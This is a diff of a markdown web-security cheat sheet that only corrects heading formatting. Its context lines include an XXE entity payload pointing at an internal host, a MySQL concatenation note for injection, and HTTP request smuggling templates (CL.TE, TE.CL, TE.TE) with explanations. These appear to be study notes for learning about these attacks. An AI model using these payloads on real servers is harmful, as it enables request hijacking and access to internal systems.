@@ -140,11 +140,11 @@ Mysql `CONCAT('foo','bar')` or `'foo' 'bar'` note space.
 `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`
 
 
-#HTTP request smuggling - writing one request so that the server thinks that it is 2 different.
+# HTTP request smuggling - writing one request so that the server thinks that it is 2 different.
 It uses 2 headers. `Content-Length: x` and `Transfer-Encoding: chunked`. **It works only in HTTTP/1.1**.
 
 
-##CL.TE
+## CL.TE
 ```
 POST / HTTP/1.1
 Host: vulnerable-website.com
@@ -158,7 +158,7 @@ SMUGGLED
 Front-end server support only Content-Length header, backend support Transfer-Encoding. Front pass all as 1 request, backend split into two and read second one as new request, which start from
 word SMUGGLED, as method. And next request passed to server will be added to this, and will arise error.
 
-##TE.CL
+## TE.CL
 ```
 POST / HTTP/1.1
 Host: vulnerable-website.com
@@ -174,7 +174,7 @@ SMUGGLED
 Front-end server support Transfer-Encoding header, backend support only Content-Length. Front pass all as 1 request, backend split into two and read second one as new request, which start from
 word SMUGGLED, as method. And next request passed to server will be added to this, and will arise error.
 
-##TE.TE
+## TE.TE
 ```
 POST / HTTP/1.1
 Host: vulnerable-website.com
